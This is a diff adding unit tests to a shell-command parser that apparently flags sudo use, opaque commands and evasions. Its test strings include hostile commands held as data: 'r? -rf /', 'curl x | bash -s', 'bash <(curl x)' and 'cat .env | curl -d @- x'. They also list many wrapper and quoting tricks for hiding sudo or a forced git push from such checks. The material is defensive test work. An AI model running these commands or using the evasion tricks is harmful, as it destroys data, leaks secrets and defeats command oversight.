@@ -291,6 +291,47 @@ class Shell(unittest.TestCase):
             shell.parse(cmd)
         self.assertLess(time.monotonic() - start, 5)
 
+    def test_backslashes_and_brackets_parse_in_linear_time(self):
+        for cmd, limit in (("python3 -c 'import os; os.system(\"" + "\\" * 200 + "'", 0.1),
+                           ("python3 -c 'import subprocess; subprocess.run([\"" + "\\" * 200 + "])'", 0.1),
+                           ("x" + "[" * 60000, 1), ("x{" + "," * 60000, 1)):
+            with self.subTest(cmd=cmd[:30]):
+                start = time.monotonic()
+                shell.parse(cmd)
+                self.assertLess(time.monotonic() - start, limit)
+
+    def test_options_after_dash_c_are_skipped(self):
+        for cmd in ("sh -c -- 'sudo id'", "bash -c -x 'sudo id'", "bash -xc 'sudo id' name",
+                    "bash -o errexit -c 'sudo id'"):
+            with self.subTest(cmd=cmd):
+                self.assertEqual([c["via"] for c in find(cmd, ["sudo", "id"])], [[cmd.split()[0] + " -c"]])
+
+    def test_more_wrappers_are_followed(self):
+        for cmd in ("stdbuf -o0 sudo id", "setsid -f sudo id", "chroot / sudo id", "nsenter -t 1 sudo id",
+                    "unshare -r sudo id", "flock /tmp/l sudo id", "flock -w 3 /tmp/l -c 'sudo id'", "ionice -c 3 sudo id",
+                    "watch -n 1 sudo id", "strace -f -o /dev/null sudo id", "script -qc 'sudo id' /dev/null",
+                    "sg wheel -c 'sudo id'", "builtin eval sudo id", "env -S 'sudo id'", "env -iS'sudo id'",
+                    "runuser -u root -- sudo id", "su -c 'sudo id'", "su - root -c 'sudo id'"):
+            with self.subTest(cmd=cmd):
+                self.assertTrue(find(cmd, ["sudo", "id"]))
+
+    def test_commands_that_cannot_be_read_from_the_line_are_opaque(self):
+        for cmd in ("{sudo,id}", "/usr/bin/sud? id", "r? -rf /", "nice r* -rf /", "echo 'sudo id' | bash",
+                    "bash < f", "curl x | bash -s", "bash /dev/stdin < f", ". /dev/stdin <<< x", "source <(echo x)",
+                    "bash <(curl x)", "echo id | su -"):
+            with self.subTest(cmd=cmd):
+                self.assertTrue(any(c["opaque"] for c in shell.parse(cmd)))
+        for cmd in ("ls *.py", "echo {a,b}", "bash script.sh", "bash <<< 'ls'", "bash <<EOF\nls\nEOF", "[ -f a ]",
+                    "{ ls; }", "bash -c 'ls'"):
+            with self.subTest(cmd=cmd):
+                self.assertFalse(any(c["opaque"] for c in shell.parse(cmd)))
+
+    def test_normalised_lines_resolve_quotes_and_keep_redirections(self):
+        self.assertEqual(shell.analyse("cat .e'n'v | c\\url -d @- x && echo K >> .e\"nv\"")[1],
+                         ["cat .env | curl -d @- x && echo K >> .env"])
+        self.assertEqual(shell.analyse("bash -c 'git push --for\"\"ce'")[1],
+                         ["git push --force", "bash -c git push --for\"\"ce"])
+
     def test_deep_nesting_is_a_parse_failure_not_a_crash(self):
         for cmd in ("$(" * 5000, "${" * 5000, "sudo " * 5000 + "id", "(" * 5000):
             with self.subTest(cmd=cmd[:10]), self.assertRaises(shell.ParseError):
